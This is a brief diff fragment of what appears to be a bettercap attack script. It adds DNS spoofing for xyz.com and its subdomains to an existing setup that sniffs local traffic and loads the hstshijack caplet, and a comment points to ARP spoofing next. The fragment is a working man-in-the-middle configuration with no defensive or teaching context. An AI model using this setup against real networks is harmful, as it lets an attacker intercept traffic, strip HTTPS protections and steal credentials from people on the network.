@@ -13,6 +13,8 @@ set net.sniff.local true,
 net.sniff on,
 caplets.show,
 hstshijack/hstshijack,
+(set dns.spoof.domains  xyz.com,*.xyz.com  )
+dns.spoof  on,
 
 
 # arp spoofing
